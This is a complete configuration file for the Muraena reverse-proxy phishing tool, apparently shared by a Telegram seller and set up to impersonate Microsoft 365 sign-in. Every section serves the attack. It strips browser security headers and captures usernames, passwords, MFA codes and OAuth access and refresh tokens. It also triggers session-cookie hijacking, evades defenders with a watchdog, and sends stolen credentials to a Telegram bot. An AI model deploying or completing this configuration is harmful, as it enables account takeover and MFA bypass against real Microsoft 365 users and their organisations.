#############################################################################
# MURAENA — O365 COMBINED CONFIG by t.me/officialmonsterz
# Merged: token-capture + full watchdog/redirect/decoy hardening
# Placeholders to replace: YOUR-PHISHING-DOMAIN.COM, YOUR-TG-BOT-TOKEN, YOUR-TG-CHAT-ID
#############################################################################

[proxy]
    phishing = "YOUR-PHISHING-DOMAIN.COM"
    destination = "login.microsoftonline.com"
    IP = "0.0.0.0"
    port = 443
    listener = "tcp4"

    [proxy.HTTPtoHTTPS]
    enable = true
    HTTPport = 80

[origins]
    externalOriginPrefix = "cdn-"
    externalOrigins = [
        "login.live.com",
        "login.microsoft.com",
        "login.microsoftonline.com",
        "device.login.microsoftonline.com",
        "account.microsoft.com",
        "outlook.office.com",
        "outlook.office365.com",
        "office.com",
        "www.office.com",
        "aadcdn.msftauth.net",
        "aadcdn.msauth.net",
        "accdn.msftauth.net",
        "amcdn.msftauth.net",
        "secure.aadcdn.microsoftonline-p.com",
        "enterpriseregistration.windows.net",
        "res.cdn.office.net",
        "shell.cdn.office.net",
        "ow2.res.office365.com",
        "nec.video.communication.microsoft.com"
    ]

[transform]
    [transform.base64]
    enable = false
    padding = ["=", "."]

    [transform.request]
    headers = ["Cookie", "Referer", "Origin"]
    remove.headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Original-URL",
        "X-Original-Host"
    ]

    [transform.response]
    skipContentType = ["font/*", "image/*"]
    headers = [
        "Location",
        "Set-Cookie",
        "Origin",
        "WWW-Authenticate",
        "Access-Control-Allow-Origin"
    ]
    remove.headers = [
        "X-Frame-Options",
        "Content-Security-Policy",
        "Content-Security-Policy-Report-Only",
        "Report-To",
        "X-XSS-Protection",
        "X-Content-Type-Options"
    ]
    customContent = [
        ["integrity=", "integrify="]
    ]

[[redirect]]
    hostname = "YOUR-PHISHING-DOMAIN.COM"
    path = "/common/oauth2/v2.0/authorize"
    redirectTo = "https://YOUR-PHISHING-DOMAIN.COM/mail"
    httpStatusCode = 302

[[redirect]]
    hostname = "YOUR-PHISHING-DOMAIN.COM"
    path = "/owa/"
    redirectTo = "https://YOUR-PHISHING-DOMAIN.COM/mail"
    httpStatusCode = 302

[log]
    enable = true
    filePath = "muraena.log"

[tls]
    enable = true
    expand = false
    certificate = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/fullchain.pem"
    key = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/privkey.pem"
    root = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/chain.pem"
    sslKeyLog = "./config/sslkeylog.log"
    minVersion = "TLS1.2"
    renegotiationSupport = "Never"

[tracking]
    enable = true
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_clsk"
        validator = "[a-zA-Z0-9]{22}"
        header = "X-Ms-Client-DNS"

        [tracking.trace.landing]
            type = "query"
            header = "X-Ms-Client-Region"
            # redirectTo is only used when type = "path". Not needed for query mode.

[tracking.secrets]
    paths = [
        "/common/login",
        "/common/GetCredentialType",
        "/common/SAS/ProcessAuth",
        "/common/SAS/Validate",
        "/common/SAS/BeginAuth",
        "/common/oauth2/authorize",
        "/common/GetSessionState",
        "/users/authenticated",
        "/oauth2/v2.0/token",
        "/common/federated"
    ]

    [[tracking.secrets.patterns]]
    label = "O365 Username"
    start = "loginfmt="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "O365 Username (legacy)"
    start = "login="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "O365 Password"
    start = "passwd="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "O365 TOTP / MFA Code"
    start = "otc="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "OAuth Authorization Code"
    start = "code="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "OAuth Access Token"
    start = "access_token="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "OAuth Refresh Token"
    start = "refresh_token="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "OAuth ID Token"
    start = "id_token="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "OAuth Session State"
    start = "session_state="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "Session State (compact)"
    start = "state="
    end = "&"

    [[tracking.secrets.patterns]]
    label = "Session Identifier"
    start = "session="
    end = "&"

[necrobrowser]
    enable = false
    endpoint = "http://10.0.0.2:3000/instrument"
    profile = "./config/instrument.necro"

    [necrobrowser.urls]
    authSession = ["/mail/inbox"]
    authSessionResponse = ["/owa/"]

    [necrobrowser.trigger]
    type = "cookie"
    values = ["ESTSAUTHPERSISTENT", "ESTSAUTH"]
    delay = 5

[staticServer]
    enable = true
    localPath = "./static/"
    urlPath = "/robots.txt/"

[watchdog]
    enable = true
    dynamic = true
    rules = "./config/watchdog.rules"
    geoDB = "./config/geoDB.mmdb"

[telegram]
    enable = true
    botToken = "YOUR-TG-BOT-TOKEN"
    chatIDs = ["YOUR-TG-CHAT-ID"]
